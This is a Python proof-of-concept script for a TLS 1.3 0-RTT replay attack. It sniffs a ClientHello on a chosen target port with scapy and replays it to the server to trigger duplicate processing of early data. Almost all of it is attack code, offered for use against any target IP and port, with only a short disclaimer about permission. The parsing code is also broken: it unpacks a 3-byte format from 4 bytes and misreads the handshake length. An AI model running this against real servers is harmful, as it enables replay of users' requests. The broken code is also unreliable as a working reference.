"""
Proof-of-Concept: TLS 1.3 0-RTT Data Replay Attack

This script demonstrates the vulnerability described in RFC 8446 Section 8 and E.5.
It captures a valid TLS 1.3 ClientHello containing a Pre-Shared Key (PSK) and 0-RTT early data,
then replays it to the server. If the server lacks anti-replay mechanisms (e.g., ClientHello recording),
it will process the replayed early data, potentially causing duplicate actions.

Usage:
    python poc_0rtt_replay_attack.py <TARGET_IP> <TARGET_PORT>

Note: This is for educational and security research purposes only.
Ensure you have explicit permission to test the target system.
"""

import sys
import socket
import struct
import hashlib
import time
from scapy.all import sniff, IP, TCP, Raw
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
import hmac

# --- TLS 1.3 Constants ---
TLS_VERSION = 0x0303
CONTENT_TYPE_HANDSHAKE = 0x16
CONTENT_TYPE_APPLICATION_DATA = 0x17
HANDSHAKE_TYPE_CLIENT_HELLO = 0x01
HANDSHAKE_TYPE_ENCRYPTED_EXTENSIONS = 0x08
HANDSHAKE_TYPE_FINISHED = 0x14

# --- Helper Functions ---
def build_tls_record(content_type, version, data):
    """Construct a TLS record layer."""
    return struct.pack('!BBH', content_type, version, len(data)) + data

def parse_tls_record(data):
    """Parse a TLS record layer."""
    if len(data) < 5:
        return None, None, None
    content_type, version, length = struct.unpack('!BBH', data[:5])
    return content_type, version, data[5:5+length]

def extract_client_hello(raw_data):
    """Extract ClientHello from raw TLS record."""
    content_type, version, payload = parse_tls_record(raw_data)
    if content_type != CONTENT_TYPE_HANDSHAKE or version != TLS_VERSION:
        return None
    # Handshake message format: type(1) + length(3) + body
    if len(payload) < 4:
        return None
    msg_type, msg_len = struct.unpack('!BH', payload[:4])
    if msg_type != HANDSHAKE_TYPE_CLIENT_HELLO:
        return None
    return payload[4:4+msg_len]

def capture_client_hello(target_ip, target_port, timeout=10):
    """Capture a ClientHello packet from the target."""
    print(f"[*] Sniffing for ClientHello from {target_ip}:{target_port}...")
    captured_hello = None
    
    def packet_callback(packet):
        nonlocal captured_hello
        if IP in packet and TCP in packet and Raw in packet:
            if packet[TCP].dport == target_port:
                raw_data = bytes(packet[Raw].load)
                hello = extract_client_hello(raw_data)
                if hello:
                    captured_hello = raw_data  # Store full record for replay
                    print("[+] Captured ClientHello with potential 0-RTT data.")
                    raise StopIteration
    
    try:
        sniff(filter=f"tcp and port {target_port}", prn=packet_callback, timeout=timeout, store=False)
    except StopIteration:
        pass
    
    return captured_hello

def replay_packet(target_ip, target_port, packet_data):
    """Replay a captured packet to the target."""
    print(f"[*] Replaying captured packet to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.sendall(packet_data)
    
    # Receive server response
    try:
        response = sock.recv(4096)
        print("[+] Server responded to replayed packet.")
        content_type, version, payload = parse_tls_record(response)
        if content_type == CONTENT_TYPE_HANDSHAKE:
            print("[+] Server processed the replayed ClientHello.")
            # In a vulnerable server, it might accept the 0-RTT data again.
            # We can't easily decrypt the response without the keys, but the fact
            # that it responds indicates it processed the handshake.
        return response
    except socket.timeout:
        print("[-] No response from server.")
        return None
    finally:
        sock.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_0rtt_replay_attack.py <TARGET_IP> <TARGET_PORT>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Step 1: Capture a valid ClientHello with 0-RTT data
    # In a real scenario, this would be captured from a legitimate client.
    # For this PoC, we assume the attacker can sniff the network.
    captured_data = capture_client_hello(target_ip, target_port)
    
    if not captured_data:
        print("[-] Failed to capture a ClientHello. Ensure a client is connecting with 0-RTT.")
        sys.exit(1)
    
    # Step 2: Replay the captured packet
    # This simulates the attacker duplicating the flight of 0-RTT data.
    replay_packet(target_ip, target_port, captured_data)
    
    print("\n[!] If the server is vulnerable, it will process the replayed 0-RTT data.")
    print("    This could lead to duplicate actions, cache poisoning, or resource exhaustion.")
    print("    Check server logs for duplicate processing of the early data.")

if __name__ == "__main__":
    main()
